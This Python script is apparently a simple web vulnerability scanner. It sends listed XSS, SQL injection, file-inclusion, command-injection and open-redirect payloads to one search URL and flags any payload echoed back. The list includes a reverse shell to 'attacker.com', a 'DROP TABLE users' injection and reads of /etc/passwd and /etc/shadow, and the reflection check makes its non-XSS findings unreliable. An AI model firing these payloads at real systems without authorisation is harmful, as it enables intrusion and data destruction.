import os
import json
import time
import requests
from colorama import Fore, Style, init

# Initialize colorama for colored output
init(autoreset=True)

# Load Config
CONFIG_FILE = "config/settings.json"
if not os.path.exists(CONFIG_FILE):
    print(Fore.RED + f"⚠️ Config file {CONFIG_FILE} is missing! Run `setup_config.py`")
    exit(1)

with open(CONFIG_FILE) as config_file:
    config = json.load(config_file)

TARGET = config.get("TARGET", "example.com")
TIMEOUT = config.get("TIMEOUT", 10)

# Payloads (Using predefined lists)
PAYLOADS = {
    "XSS": [
        "<script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "';alert(1)//"
    ],
    "SQLi": [
        "' OR 1=1 --",
        "' UNION SELECT null,version() --",
        "'; DROP TABLE users --"
    ],
    "LFI": [
        "../../../../etc/passwd",
        "../../../../windows/win.ini",
        "../etc/shadow"
    ],
    "RCE": [
        "`whoami`",
        "$(id)",
        "nc -e /bin/sh attacker.com 4444"
    ],
    "Open Redirect": [
        "https://evil.com",
        "//evil.com",
        "/%2f%2fevil.com"
    ]
}

# Function to scan for vulnerabilities
def scan_vulnerabilities():
    print(Fore.CYAN + f"🔍 Scanning {TARGET} for vulnerabilities...")

    vulnerable_endpoints = []
    for vuln_type, payloads in PAYLOADS.items():
        for payload in payloads:
            url = f"http://{TARGET}/search?q={payload}"
            try:
                response = requests.get(url, timeout=TIMEOUT)

                if response.status_code == 200 and payload in response.text:
                    print(Fore.GREEN + f"✅ {vuln_type} found at {url}")
                    vulnerable_endpoints.append({"type": vuln_type, "url": url, "payload": payload})
                else:
                    print(Fore.YELLOW + f"⚠️ No {vuln_type} detected at {url}")

            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"❌ Timeout or connection error: {url}")

    return vulnerable_endpoints

# Save scan results
def save_results(data):
    os.makedirs("reports", exist_ok=True)
    report_path = f"reports/{TARGET}_scan.json"

    with open(report_path, "w") as report_file:
        json.dump(data, report_file, indent=4)

    print(Fore.GREEN + f"📄 Scan Report saved: {report_path}")

# Main Execution
def main():
    print(Fore.MAGENTA + "🚀 Running Active Vulnerability Scan...")
    start_time = time.time()

    scan_results = scan_vulnerabilities()
    save_results(scan_results)

    end_time = time.time()
    print(Fore.GREEN + f"✅ Active Vulnerability Scan completed in {round(end_time - start_time, 2)} seconds.")

if __name__ == "__main__":
    main()
